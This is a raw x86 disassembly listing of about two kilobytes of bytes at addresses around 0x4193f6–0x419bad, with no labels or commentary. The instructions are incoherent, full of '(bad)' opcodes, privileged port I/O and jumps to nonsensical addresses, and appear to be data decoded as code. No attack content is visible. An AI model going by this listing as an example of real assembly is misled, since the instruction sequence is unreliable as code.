  4193f6:	ins    DWORD PTR es:[edi],dx
  4193f7:	fldcw  WORD PTR [edi-0x5d]
  4193fa:	cli    
  4193fb:	jp     0x419451
  4193fd:	mov    dl,BYTE PTR [ecx+0x3869e7de]
  419403:	loope  0x41941f
  419405:	inc    esp
  419406:	add    bh,BYTE PTR [ecx]
  419408:	xor    bl,BYTE PTR [ecx-0x3c]
  41940b:	fadd   QWORD PTR [edx+eax*2]
  41940e:	xor    DWORD PTR [esi],edx
  419410:	adc    DWORD PTR [esi],ecx
  419412:	push   edx
  419413:	out    dx,eax
  419414:	push   edx
  419415:	ja     0x41943c
  419417:	int    0xc2
  419419:	jge    0x419453
  41941b:	adc    BYTE PTR [eax-0x18],0xba
  41941f:	mov    al,0x84
  419421:	add    ebp,DWORD PTR [ebx+0x34]
  419424:	lock cmc 
  419426:	fcomp  QWORD PTR [ebx]
  419428:	xchg   ebp,eax
  419429:	fild   QWORD PTR [eax-0x16a600c4]
  41942f:	mov    ah,0xc
  419431:	mov    ds:0x2b84505d,eax
  419436:	call   0x4c386a02
  41943b:	icebp  
  41943c:	xchg   ebx,eax
  41943d:	pushf  
  41943e:	jle    0x41945c
  419440:	adc    edx,DWORD PTR [edi]
  419442:	lods   al,BYTE PTR ds:[esi]
  419443:	or     ah,BYTE PTR [edi]
  419445:	retf   
  419446:	cmpps  xmm5,XMMWORD PTR [eax-0x4e9c275c],0x79
  41944e:	pop    ebx
  41944f:	xchg   ebp,eax
  419450:	xor    cl,BYTE PTR [edx]
  419452:	pop    edi
  419453:	mov    esp,0xcd1cd139
  419458:	std    
  419459:	inc    esp
  41945a:	das    
  41945b:	loope  0x4194d6
  41945d:	xchg   esi,eax
  41945e:	xor    ecx,ebx
  419460:	je     0x4194e1
  419462:	mov    eax,ds:0x29572d4d
  419467:	push   es
  419468:	stc    
  419469:	fidivr WORD PTR [esi]
  41946b:	call   esi
  41946d:	mov    edi,0x9cf7d761
  419472:	jge    0x419490
  419474:	dec    edi
  419475:	adc    BYTE PTR [edx+0x5941fa74],al
  41947b:	jmp    0xfd1e398e
  419480:	pop    eax
  419481:	inc    edx
  419482:	mov    esp,0x7c91e12a
  419487:	sub    DWORD PTR [esp+ecx*4+0x30],eax
  41948b:	imul   ebx,DWORD PTR [edi+esi*8-0x13],0xffffffce
  419490:	lock inc esp
  419492:	mov    esi,0xd7c31d9b
  419497:	js     0x4194c2
  419499:	lods   eax,DWORD PTR ds:[esi]
  41949a:	mov    ebp,DWORD PTR [edi]
  41949c:	ret    
  41949d:	mov    WORD PTR [eax+0x27114d51],gs
  4194a3:	cmc    
  4194a4:	pop    ebx
  4194a5:	fldcw  WORD PTR [edi+0x1c4261d3]
  4194ab:	retf   0xb57f
  4194ae:	mov    ebx,0x4c851856
  4194b3:	imul   edi,DWORD PTR [ebp+0x5a],0xba832062
  4194ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194bb:	xor    BYTE PTR [ecx+0x4aeea85c],bl
  4194c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194c3:	das    
  4194c4:	enter  0x3d49,0x6b
  4194c8:	mov    ebx,0xb80ae9ce
  4194cd:	adc    BYTE PTR [ebx],bh
  4194cf:	jge    0x419501
  4194d1:	out    dx,al
  4194d2:	sahf   
  4194d3:	cmp    BYTE PTR [edi],al
  4194d5:	sbb    BYTE PTR [esi-0x46d9eb35],0x19
  4194dc:	xor    al,0xc
  4194de:	cld    
  4194df:	xchg   edi,esp
  4194e1:	xor    eax,0x821b5b89
  4194e6:	es dec edx
  4194e8:	leave  
  4194e9:	sti    
  4194ea:	inc    ebx
  4194eb:	push   edi
  4194ec:	leave  
  4194ed:	xchg   ecx,eax
  4194ee:	mov    fs,WORD PTR cs:[ebx+0x3f21fd57]
  4194f5:	loop   0x4194f2
  4194f7:	enter  0xf9e5,0x97
  4194fb:	or     eax,0xa8fea0cd
  419500:	cmp    edi,esi
  419502:	sbb    BYTE PTR [edi+0x2],dh
  419505:	inc    esi
  419506:	push   edi
  419507:	mov    cl,0xbb
  419509:	jns    0x41958a
  41950b:	mov    bl,ch
  41950d:	sar    edx,0xfe
  419510:	or     DWORD PTR [ecx],0x2d2c53aa
  419516:	pop    esp
  419517:	(bad)  
  419518:	mov    ebx,0x5229ba53
  41951d:	or     ebp,ecx
  41951f:	push   ss
  419520:	js     0x419509
  419522:	pushf  
  419523:	mov    ah,0x50
  419525:	dec    ecx
  419526:	fild   QWORD PTR [edx]
  419528:	dec    esi
  419529:	fist   WORD PTR [ebx]
  41952b:	retf   0x33ed
  41952e:	mov    ecx,cs
  419530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419531:	cdq    
  419532:	gs enter 0x1d75,0xe9
  419537:	push   edi
  419538:	or     esi,esi
  41953a:	push   cs
  41953b:	je     0x41953c
  41953d:	lock cmp ebp,DWORD PTR [ebx+0x42]
  419541:	nop
  419542:	cmp    ecx,esp
  419544:	mov    ?,ebx
  419546:	ds xor al,0x41
  419549:	in     al,0x96
  41954b:	and    ecx,ebx
  41954d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41954e:	ficom  WORD PTR [edi+0x26]
  419551:	mov    eax,DWORD PTR [edx-0x34]
  419554:	mov    cl,0x2f
  419556:	fcmovb st,st(4)
  419558:	(bad)  
  419559:	outs   dx,BYTE PTR ds:[esi]
  41955a:	push   cs
  41955b:	mov    ebp,0xbfe6af2d
  419560:	sub    cl,BYTE PTR [esi-0x1b7ad6fe]
  419566:	push   es
  419567:	jno    0x4195e2
  419569:	imul   esi,DWORD PTR [esp+ebx*1],0xffffffc5
  41956d:	retf   
  41956e:	add    ah,BYTE PTR [edi+0xd4629c6]
  419574:	aad    0x1
  419576:	and    ebp,esi
  419578:	dec    esp
  419579:	dec    esp
  41957a:	jae    0x41950f
  41957c:	sahf   
  41957d:	xchg   ebp,eax
  41957e:	push   ebp
  41957f:	cs inc edi
  419581:	dec    esp
  419582:	ror    BYTE PTR [eax],0x6f
  419585:	imul   edx,DWORD PTR [esi+ebp*1-0x5bc9549c],0xfffffff6
  41958d:	repnz cmp al,0xc0
  419590:	mov    ch,0x65
  419592:	jmp    0x81f798c0
  419597:	fwait
  419598:	(bad)  
  419599:	aas    
  41959a:	and    al,0x25
  41959c:	adc    BYTE PTR [esi+0x73],bh
  41959f:	pop    es
  4195a0:	sbb    al,0xf8
  4195a2:	pop    esi
  4195a3:	stos   BYTE PTR es:[edi],al
  4195a4:	cmp    al,0xf1
  4195a6:	rcl    BYTE PTR [edx],1
  4195a8:	int    0x91
  4195aa:	retf   
  4195ab:	and    eax,0xbfc39aff
  4195b0:	pop    eax
  4195b1:	xor    DWORD PTR [esi],ebp
  4195b3:	pop    ebp
  4195b4:	(bad)  
  4195b6:	jno    0x4195ec
  4195b8:	push   0x9dca876c
  4195bd:	bound  edi,QWORD PTR [eax+0x4e5ec527]
  4195c3:	jae    0x419585
  4195c5:	push   ebp
  4195c6:	sar    al,cl
  4195c8:	jne    0x41954e
  4195ca:	sti    
  4195cb:	call   0x357c:0xbb630385
  4195d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195d3:	adc    al,0xe5
  4195d5:	pop    esi
  4195d6:	jbe    0x41962e
  4195d8:	xchg   ebx,eax
  4195d9:	add    DWORD PTR [edx-0x76],ecx
  4195dc:	push   cs
  4195dd:	push   es
  4195de:	mov    ecx,0x159a8f0f
  4195e3:	jmp    0xd48ec1a
  4195e8:	pop    esi
  4195e9:	cmc    
  4195ea:	add    BYTE PTR ds:0x41454b39,0xa3
  4195f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195f2:	sub    eax,0xe2b71b2d
  4195f7:	iret   
  4195f8:	lods   al,BYTE PTR ds:[esi]
  4195f9:	pop    ecx
  4195fa:	jbe    0x4195b6
  4195fc:	jl     0x419636
  4195fe:	dec    ecx
  4195ff:	nop
  419600:	clc    
  419601:	mov    ds:0x370e0ca6,eax
  419606:	sub    dh,dh
  419608:	scas   eax,DWORD PTR es:[edi]
  419609:	jb     0x419645
  41960b:	imul   ebp,DWORD PTR [edx],0x1ab925a3
  419611:	aam    0x63
  419613:	jno    0x4195ec
  419615:	xor    cl,BYTE PTR [esi-0x4ac553d2]
  41961b:	dec    edi
  41961c:	jle    0x4195db
  41961e:	xchg   edi,eax
  41961f:	sub    dh,BYTE PTR [edi+ebx*4-0x45]
  419623:	push   esp
  419624:	shl    BYTE PTR [edx+0x6a],cl
  419627:	in     eax,dx
  419628:	push   esi
  419629:	sbb    eax,0x4bd3f280
  41962e:	mov    edi,0x455ad38f
  419633:	and    DWORD PTR [eax+0x2fc72f5],ebp
  419639:	dec    ebx
  41963a:	call   0x3ab00d30
  41963f:	cmp    eax,0x8177846f
  419644:	mov    ecx,0x4a7eadba
  419649:	fmul   DWORD PTR [esi+0x6d]
  41964c:	or     eax,0xf35a28ad
  419651:	dec    edi
  419652:	mov    bl,0x85
  419654:	popf   
  419655:	cs loope 0x4196a8
  419658:	neg    DWORD PTR [eax+0x768864c]
  41965e:	mov    cl,0x19
  419660:	enter  0x59ef,0x1e
  419664:	xchg   ebx,eax
  419665:	ins    BYTE PTR es:[edi],dx
  419666:	xchg   edx,eax
  419667:	cs cs xor esi,DWORD PTR cs:[eax+0x3d7bd845]
  419670:	bound  esi,QWORD PTR [ecx+0x6ccb0c07]
  419676:	mov    ah,0xd8
  419678:	fild   QWORD PTR [edx]
  41967a:	inc    eax
  41967b:	jecxz  0x419650
  41967d:	jbe    0x4196e0
  41967f:	loope  0x419678
  419681:	xor    BYTE PTR [edx+0x57],dl
  419684:	ja     0x4196a1
  419686:	out    dx,al
  419687:	in     al,0x36
  419689:	les    edx,FWORD PTR [eax+edx*1+0x75]
  41968d:	dec    edx
  41968e:	pop    ds
  41968f:	test   al,0x8c
  419691:	cmp    BYTE PTR [ebx+0x625bc07e],bl
  419697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419698:	stos   BYTE PTR es:[edi],al
  419699:	jns    0x419649
  41969b:	or     ebp,DWORD PTR [esi+0xc]
  41969e:	mov    ah,0x88
  4196a0:	test   cl,bl
  4196a2:	mov    ecx,DWORD PTR [edx+0x3e3a3b3]
  4196a8:	dec    BYTE PTR [ebp+0x1a4fae54]
  4196ae:	leave  
  4196af:	pop    edi
  4196b0:	push   ds
  4196b1:	or     ch,dh
  4196b3:	xchg   BYTE PTR [ecx-0x60be60c5],bh
  4196b9:	sbb    al,0xb0
  4196bb:	cdq    
  4196bc:	xor    eax,0xcc2efc4e
  4196c1:	cmp    BYTE PTR [esi+ecx*4+0x2a],cl
  4196c5:	cli    
  4196c6:	aas    
  4196c7:	mov    ?,WORD PTR [esi+0x7]
  4196ca:	icebp  
  4196cb:	xlat   BYTE PTR ds:[ebx]
  4196cc:	inc    ecx
  4196cd:	mov    ss,eax
  4196cf:	xchg   esi,eax
  4196d0:	inc    eax
  4196d1:	out    0xfb,eax
  4196d3:	aad    0x5f
  4196d5:	das    
  4196d6:	in     al,0x76
  4196d8:	je     0x41967b
  4196da:	ins    BYTE PTR es:[edi],dx
  4196db:	(bad)  
  4196dc:	outs   dx,DWORD PTR ds:[esi]
  4196dd:	leave  
  4196de:	clc    
  4196df:	imul   DWORD PTR [eax-0x5204c2f4]
  4196e5:	addr16 jmp 0x9c733712
  4196eb:	test   BYTE PTR [eax],al
  4196ed:	jle    0x41973b
  4196ef:	lods   eax,DWORD PTR ds:[esi]
  4196f0:	cs fwait
  4196f2:	inc    edx
  4196f3:	pop    ebx
  4196f4:	add    edi,esi
  4196f6:	mov    edi,0x4fbbaac
  4196fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196fc:	push   cs
  4196fd:	mov    dl,0x33
  4196ff:	fsub   st,st(3)
  419701:	inc    esp
  419702:	mov    ch,0x71
  419704:	(bad)  
  419705:	xchg   edx,eax
  419706:	cmp    BYTE PTR [edx],0x29
  419709:	push   ds
  41970a:	cwde   
  41970b:	mov    es:0xa0aa6b17,eax
  419711:	push   0x2dbc2475
  419716:	in     eax,0x18
  419718:	ret    0xf1c
  41971b:	(bad)
  41971f:	jmp    0x9c907b6
  419724:	mov    fs,WORD PTR [edi]
  419726:	ds pop ds
  419728:	jo     0x41972c
  41972a:	jl     0x419700
  41972c:	les    edx,FWORD PTR ds:0x8a31c539
  419732:	mov    bl,0x67
  419734:	add    BYTE PTR [esi-0x303339af],cl
  41973a:	nop
  41973b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41973c:	loope  0x41973a
  41973e:	ficom  DWORD PTR [eax-0x13c135dc]
  419744:	daa    
  419745:	es scas eax,DWORD PTR es:[edi]
  419747:	dec    esi
  419748:	mov    DWORD PTR [ebp+0x54],ebx
  41974b:	mov    BYTE PTR [eax+eax*8],dh
  41974e:	mov    al,0xdf
  419750:	ret    
  419751:	scas   eax,DWORD PTR es:[edi]
  419752:	adc    al,0xc6
  419754:	rol    DWORD PTR [edx],0x6b
  419757:	pop    esp
  419758:	hlt    
  419759:	ins    DWORD PTR es:[edi],dx
  41975a:	and    BYTE PTR [ecx-0x6e],dl
  41975d:	and    DWORD PTR [edx+0x19],esi
  419760:	sub    al,0xde
  419762:	rcr    BYTE PTR [edx+0x697e0c49],0x8d
  419769:	and    DWORD PTR [edx-0x73],ebx
  41976c:	popa   
  41976d:	and    al,0x7b
  41976f:	cmp    al,0x6f
  419771:	cmp    DWORD PTR [ebx+0x380832d],ebp
  419777:	xor    DWORD PTR [eax+0x6e],ecx
  41977a:	cs xchg edi,eax
  41977c:	or     BYTE PTR [ebp+0x7d],al
  41977f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419780:	aas    
  419781:	push   edi
  419782:	push   edx
  419783:	cli    
  419784:	adc    al,0x4f
  419786:	test   DWORD PTR [ecx+0xcfc336c],ebx
  41978c:	jmp    0x4d8a2574
  419791:	stc    
  419792:	push   es
  419793:	shr    DWORD PTR [esi-0x77],cl
  419796:	out    dx,al
  419797:	cmc    
  419798:	push   0x51
  41979a:	out    dx,al
  41979b:	lods   al,BYTE PTR ds:[esi]
  41979c:	lods   eax,DWORD PTR ds:[esi]
  41979d:	addr16 jne 0x4197ba
  4197a0:	shl    edx,0x63
  4197a3:	outs   dx,DWORD PTR ds:[esi]
  4197a4:	add    ah,BYTE PTR [ebx-0x42]
  4197a7:	popa   
  4197a8:	shl    DWORD PTR [edi+0x4c1d6b6a],1
  4197ae:	int3   
  4197af:	jl     0x41979c
  4197b1:	cli    
  4197b2:	lods   al,BYTE PTR ds:[esi]
  4197b3:	sbb    BYTE PTR [ebx-0xc0f6e],dl
  4197b9:	pop    ebp
  4197ba:	inc    ecx
  4197bb:	in     eax,dx
  4197bc:	xor    al,0xbe
  4197be:	cs cld 
  4197c0:	pop    ecx
  4197c1:	mov    ss,WORD PTR [eax+ecx*1+0x7b6e0b7f]
  4197c8:	mov    ebp,0x60af8e10
  4197cd:	shl    DWORD PTR [eax-0x3b],1
  4197d0:	sbb    eax,0xbf7949d3
  4197d5:	shl    BYTE PTR [edi+0x1e267add],0xad
  4197dc:	mov    ax,0xd651
  4197e0:	adc    DWORD PTR [ecx-0x535bcbce],edi
  4197e6:	cmp    ah,ch
  4197e8:	dec    DWORD PTR [eax+0x75eb2e5e]
  4197ee:	outs   dx,BYTE PTR ds:[esi]
  4197ef:	mov    edi,0xd1c6ca98
  4197f4:	mov    edx,0xd41f1645
  4197f9:	xor    DWORD PTR [eax],edx
  4197fb:	xor    BYTE PTR [edi-0x64],dh
  4197fe:	in     al,0x5c
  419800:	cwde   
  419801:	ins    DWORD PTR es:[edi],dx
  419802:	jmp    0x1c0a:0xb189168e
  419809:	cmp    eax,0xd92af080
  41980e:	(bad)  
  41980f:	cdq    
  419810:	jle    0x419859
  419812:	xor    dl,0x60
  419815:	call   0x2499:0x7ea68a9
  41981c:	mov    al,0xf8
  41981e:	je     0x419881
  419820:	lea    eax,[eax]
  419822:	add    ch,al
  419824:	sub    edx,DWORD PTR ds:0x9c185bd4
  41982a:	mov    ds:0xa6558a1d,al
  41982f:	mov    eax,0x237b8ffc
  419834:	and    eax,0x8a991d96
  419839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41983a:	jle    0x419876
  41983c:	dec    ebx
  41983d:	push   es
  41983e:	jmp    0xa846:0x820e9eed
  419845:	repz add esi,DWORD PTR [eax-0x3183bc59]
  41984c:	jmp    0x4197ea
  41984e:	stos   BYTE PTR es:[edi],al
  41984f:	arpl   WORD PTR [esi+0x69],sp
  419852:	addr16 dec edi
  419854:	hlt    
  419855:	push   esp
  419856:	push   ebx
  419857:	and    edi,ecx
  419859:	xchg   ebx,eax
  41985a:	lds    esp,FWORD PTR [ebx+0x60e9b94b]
  419860:	ins    BYTE PTR es:[edi],dx
  419861:	jno    0x4198cb
  419863:	mov    eax,0x8d8719af
  419868:	dec    ecx
  419869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41986a:	cli    
  41986b:	bound  esp,QWORD PTR [edi+0x1ea7b6e4]
  419871:	(bad)  
  419873:	in     eax,dx
  419874:	pop    edi
  419875:	inc    ecx
  419876:	fidiv  DWORD PTR [edx+ebx*4]
  419879:	pusha  
  41987a:	dec    edi
  41987b:	xor    dl,BYTE PTR [edi]
  41987d:	sub    esi,DWORD PTR [eax]
  41987f:	cld    
  419880:	mov    al,0xc9
  419882:	stos   BYTE PTR es:[edi],al
  419883:	adc    DWORD PTR [ebx+esi*4+0x79],esp
  419887:	push   ecx
  419888:	fwait
  419889:	push   eax
  41988a:	mov    dh,0xfc
  41988c:	popa   
  41988d:	sar    BYTE PTR [ebx],0x7a
  419890:	stos   BYTE PTR es:[edi],al
  419891:	jmp    0x4f8c:0x44f7ec8c
  419898:	sub    cl,ah
  41989a:	pop    ecx
  41989b:	mov    dh,0x4d
  41989d:	pop    ebp
  41989e:	mov    ecx,edx
  4198a0:	jge    0x4198b8
  4198a2:	sti    
  4198a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198a4:	fiadd  WORD PTR [eax+ebx*2]
  4198a7:	jmp    0x4198f4
  4198a9:	mov    edi,0x6c92e744
  4198ae:	fsubp  st(0),st
  4198b0:	test   BYTE PTR [edx+0x3],al
  4198b3:	in     eax,dx
  4198b4:	lods   eax,DWORD PTR ds:[esi]
  4198b5:	lahf   
  4198b6:	jno    0x419911
  4198b8:	inc    ecx
  4198b9:	mov    al,0x2c
  4198bb:	jg     0x41989c
  4198bd:	clc    
  4198be:	stos   DWORD PTR es:[edi],eax
  4198bf:	scas   al,BYTE PTR es:[edi]
  4198c0:	test   DWORD PTR [eax+0x5a],ebx
  4198c3:	mov    dl,0x37
  4198c5:	pop    es
  4198c6:	repnz cld 
  4198c8:	mov    esp,0x82504523
  4198cd:	leave  
  4198ce:	mov    esi,0xd99103b9
  4198d3:	xor    BYTE PTR [esi+ebp*8],ch
  4198d6:	imul   edi,DWORD PTR [edx-0x49],0xf35dd421
  4198dd:	into   
  4198de:	mov    ebp,0x763584e6
  4198e3:	shr    BYTE PTR [eax],0x13
  4198e6:	mov    gs,eax
  4198e8:	js     0x419957
  4198ea:	cmp    cl,BYTE PTR [eax+0x5ed0c22]
  4198f0:	int    0x7f
  4198f2:	ficom  DWORD PTR [ebx-0x38]
  4198f5:	or     ecx,ebx
  4198f7:	pop    ss
  4198f8:	xchg   ecx,eax
  4198f9:	inc    ecx
  4198fa:	push   0x84097472
  4198ff:	jo     0x419919
  419901:	push   ss
  419902:	fmul   QWORD PTR [esi]
  419904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419905:	clc    
  419906:	cs dec ebp
  419908:	adc    dh,ah
  41990a:	xlat   BYTE PTR ds:[ebx]
  41990b:	mov    esi,0xf013d60e
  419910:	cmc    
  419911:	addr16 mov eax,0x15fd6ed3
  419917:	sbb    bl,al
  419919:	imul   eax,DWORD PTR [edx+0x364e545b],0xffffffef
  419920:	in     al,0xef
  419922:	mov    cl,0xf3
  419924:	add    al,0x87
  419926:	and    DWORD PTR [edx-0x4961ee59],eax
  41992c:	repz push cs
  41992e:	sbb    BYTE PTR [ebp-0x64],dl
  419931:	lea    esp,[ebp+0x3c6abdea]
  419937:	or     al,0x1c
  419939:	mov    esp,DWORD PTR [esi-0x14]
  41993c:	adc    cl,BYTE PTR [esi]
  41993e:	add    ah,ah
  419940:	icebp  
  419941:	pushf  
  419942:	or     BYTE PTR [ecx],al
  419944:	das    
  419945:	out    dx,eax
  419946:	jge    0x4199b2
  419948:	jge    0x4198cf
  41994a:	mov    ds:0x3374689,eax
  41994f:	clc    
  419950:	mov    esp,0x2d89ed6e
  419955:	mov    dh,bl
  419957:	lods   al,BYTE PTR ds:[esi]
  419958:	ds mov esi,0x674553e0
  41995e:	je     0x419943
  419960:	push   ss
  419961:	div    BYTE PTR [ebx+eiz*8+0x89eb22b]
  419968:	leave  
  419969:	cld    
  41996a:	pop    eax
  41996b:	inc    edi
  41996c:	sub    esi,0x31
  41996f:	in     eax,dx
  419970:	dec    ebx
  419971:	mov    dh,0xd7
  419973:	mov    cl,0xf4
  419975:	test   eax,0xa99eba4e
  41997a:	mov    edx,0x6be380b4
  41997f:	loop   0x419903
  419981:	inc    ecx
  419982:	mov    ds:0x1e00cbcf,eax
  419987:	out    0x8,eax
  419989:	and    eax,0x7214e622
  41998e:	outs   dx,DWORD PTR ds:[esi]
  41998f:	into   
  419990:	xchg   esi,eax
  419991:	int3   
  419992:	cwde   
  419993:	test   eax,ecx
  419995:	lods   al,BYTE PTR ds:[esi]
  419996:	lods   al,BYTE PTR ds:[esi]
  419997:	cmp    ebp,edi
  419999:	pop    ds
  41999a:	cmc    
  41999b:	xor    eax,0xdcf3f0d
  4199a0:	in     eax,0xf3
  4199a2:	jnp    0x4199de
  4199a4:	ror    BYTE PTR [ebp+0x1039cf],0xef
  4199ab:	cmp    DWORD PTR [ecx],edx
  4199ad:	mov    ebp,0x168683f3
  4199b2:	cmp    edx,DWORD PTR [eax+0x1b623e7b]
  4199b8:	icebp  
  4199b9:	sub    esi,ebx
  4199bb:	out    dx,eax
  4199bc:	ins    DWORD PTR es:[edi],dx
  4199bd:	test   al,0xb9
  4199bf:	push   ebx
  4199c0:	ss (bad) 
  4199c2:	sbb    DWORD PTR [ecx],0x4c
  4199c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199c6:	jo     0x419963
  4199c8:	jmp    0x419952
  4199ca:	hlt    
  4199cb:	mov    edi,0xca868b8f
  4199d0:	imul   eax,DWORD PTR [ebx-0x25],0xcdf1a742
  4199d7:	cli    
  4199d8:	xchg   ecx,eax
  4199d9:	push   ebx
  4199da:	je     0x41999c
  4199dc:	inc    edi
  4199dd:	push   ecx
  4199de:	scas   al,BYTE PTR es:[edi]
  4199df:	popf   
  4199e0:	in     eax,dx
  4199e1:	call   0xcfb39bcd
  4199e6:	inc    eax
  4199e7:	(bad)
  4199eb:	(bad)  
  4199ec:	mov    al,0x2d
  4199ee:	scas   eax,DWORD PTR es:[edi]
  4199ef:	loopne 0x4199da
  4199f1:	mov    cl,0x58
  4199f3:	stc    
  4199f4:	test   esp,edi
  4199f6:	sar    DWORD PTR ds:0x235fcc32,1
  4199fc:	pop    ss
  4199fd:	arpl   WORD PTR [edx],cx
  4199ff:	in     eax,0xfe
  419a01:	mov    ds:0xbf03660c,al
  419a06:	call   0x7b142ecf
  419a0b:	mov    db3,esp
  419a0e:	mov    ebx,0x259e3b72
  419a13:	mov    ah,0x80
  419a15:	in     al,0x9e
  419a17:	mov    WORD PTR [esi-0x5c],cs
  419a1a:	pop    edi
  419a1b:	lock lea esi,[esi]
  419a1e:	bound  ecx,QWORD PTR ds:0xc529f9c
  419a24:	inc    esi
  419a25:	or     dl,BYTE PTR [ebx-0x2dc855fb]
  419a2b:	push   0x4f
  419a2d:	cmp    dh,0x21
  419a30:	push   edi
  419a31:	pop    esi
  419a32:	xlat   BYTE PTR ds:[ebx]
  419a33:	idiv   DWORD PTR [eax+0x16]
  419a36:	mov    eax,ds:0xbc2d29df
  419a3b:	cdq    
  419a3c:	icebp  
  419a3d:	aaa    
  419a3e:	inc    edi
  419a3f:	sub    cl,ah
  419a41:	jo     0x419aa6
  419a43:	add    ah,BYTE PTR [esi+eax*1]
  419a46:	int3   
  419a47:	fcom   DWORD PTR [ecx]
  419a49:	imul   edx,DWORD PTR [esi+ebx*4],0x68
  419a4d:	pop    es
  419a4e:	loope  0x419a85
  419a50:	pop    ecx
  419a51:	push   esp
  419a52:	and    eax,0x286f5ae3
  419a57:	test   BYTE PTR [eax+0x33],ah
  419a5a:	mov    ds:0x837912fa,eax
  419a5f:	mov    ch,0x44
  419a61:	add    BYTE PTR [edi+0x74],0x8e
  419a65:	int3   
  419a66:	pop    esi
  419a67:	push   eax
  419a68:	adc    dl,al
  419a6a:	addr16 mov dh,0xa6
  419a6d:	fcom   st(5)
  419a6f:	inc    edx
  419a70:	ds into 
  419a72:	jmp    0x419ac7
  419a74:	stos   BYTE PTR es:[edi],al
  419a75:	sbb    al,0x1a
  419a77:	adc    ch,ch
  419a79:	sub    cl,BYTE PTR [edx+edx*1-0x18dfbcaa]
  419a80:	pushf  
  419a81:	test   eax,0xa2394ca
  419a86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a87:	adc    bl,ch
  419a89:	add    eax,0x882c735f
  419a8e:	fld    TBYTE PTR [edi]
  419a90:	or     DWORD PTR [edx-0x60685f96],0xffffff9e
  419a97:	cmp    dl,0xf0
  419a9a:	cmp    DWORD PTR [ebp+0x2a88632],0xffffffd9
  419aa1:	or     BYTE PTR ds:0x51749d1c,dh
  419aa7:	fldenv ds:0x44e7428c
  419aad:	mov    ds:0xdfbeb6e6,al
  419ab2:	(bad)  
  419ab3:	cmc    
  419ab4:	inc    ecx
  419ab5:	ins    DWORD PTR es:[edi],dx
  419ab6:	leave  
  419ab7:	or     edx,ebp
  419ab9:	(bad)  
  419aba:	dec    esi
  419abb:	call   0x32db9c0e
  419ac0:	aas    
  419ac1:	ret    0xf59b
  419ac4:	cmp    ecx,DWORD PTR [ecx-0x73c957e3]
  419aca:	cs jge 0x419a70
  419acd:	stos   BYTE PTR es:[edi],al
  419ace:	loop   0x419ae8
  419ad0:	adc    DWORD PTR [edx+0x7d],eax
  419ad3:	mov    esp,0x433e6185
  419ad8:	stos   DWORD PTR es:[edi],eax
  419ad9:	sub    ch,BYTE PTR [ebx-0x2310cc34]
  419adf:	dec    edx
  419ae0:	jmp    0xccacd4f7
  419ae5:	int    0x80
  419ae7:	cmp    eax,DWORD PTR [edx-0x27]
  419aea:	mov    dl,0x6b
  419aec:	sar    DWORD PTR [esi+0x1],cl
  419aef:	ffreep st(1)
  419af1:	ins    BYTE PTR es:[edi],dx
  419af2:	mov    esi,0x99845ef0
  419af7:	mov    bh,0x57
  419af9:	cmp    al,0xd5
  419afb:	jb     0x419b1f
  419afd:	(bad)  
  419afe:	mov    al,ds:0x563c7bb3
  419b03:	mov    ch,0x9e
  419b05:	lock loopne 0x419b29
  419b08:	shr    BYTE PTR [ecx+0x4a],1
  419b0b:	sahf   
  419b0c:	pop    ss
  419b0d:	int    0x7
  419b0f:	push   ebp
  419b10:	pop    eax
  419b11:	and    esp,DWORD PTR [eax+eiz*2+0x9dac343]
  419b18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b19:	aas    
  419b1a:	lock into 
  419b1c:	ret    
  419b1d:	adc    eax,0x9bd57e9
  419b22:	push   edx
  419b23:	jno    0x419af3
  419b25:	xchg   ebp,eax
  419b26:	call   0xc2b4:0xe0d6b54a
  419b2d:	clc    
  419b2e:	nop
  419b2f:	push   edx
  419b30:	(bad)  
  419b31:	pop    edi
  419b32:	pop    ebx
  419b33:	lods   eax,DWORD PTR ds:[esi]
  419b34:	bt     DWORD PTR ds:0x87f16328,ecx
  419b3b:	add    BYTE PTR [ebx-0x6c],0x44
  419b3f:	sub    al,0xd0
  419b41:	adc    al,0x38
  419b43:	fisttp QWORD PTR [eax]
  419b45:	mov    ebx,DWORD PTR [eax+0x4498bee9]
  419b4b:	bound  esi,QWORD PTR [ebx]
  419b4d:	mov    DWORD PTR ds:0x345cb8af,ecx
  419b53:	mov    BYTE PTR [ecx-0x44f58c25],bl
  419b59:	in     eax,dx
  419b5a:	mov    ss,WORD PTR [eax]
  419b5c:	cmp    al,0x90
  419b5e:	lods   eax,DWORD PTR ds:[esi]
  419b5f:	cs jno 0x419b8a
  419b62:	adc    al,0x7c
  419b64:	adc    DWORD PTR [eax-0x4a224e3c],edx
  419b6a:	sbb    ecx,DWORD PTR [edx+edi*2+0x42ef6337]
  419b71:	fistp  WORD PTR [ecx-0x2b4de3e3]
  419b77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b78:	retf   0x1cf6
  419b7b:	mov    ebp,DWORD PTR [ecx+edx*4]
  419b7e:	add    bh,BYTE PTR [ebp+0x12]
  419b81:	xchg   esp,eax
  419b82:	jge    0x419b04
  419b84:	xor    eax,0xe5a52f66
  419b89:	loop   0x419c02
  419b8b:	mov    ebp,0xd96048ef
  419b90:	push   edi
  419b91:	xchg   esi,eax
  419b92:	gs sahf 
  419b94:	dec    esp
  419b95:	mov    edi,DWORD PTR [edi-0x759f77e3]
  419b9b:	arpl   WORD PTR [edx-0x1f88d52],bp
  419ba1:	cmp    eax,0x26d81e05
  419ba6:	das    
  419ba7:	pushf  
  419ba8:	lods   eax,DWORD PTR ds:[esi]
  419ba9:	xor    eax,DWORD PTR [edx+0x29]
  419bac:	push   ss
  419bad:	sub    al,0x81
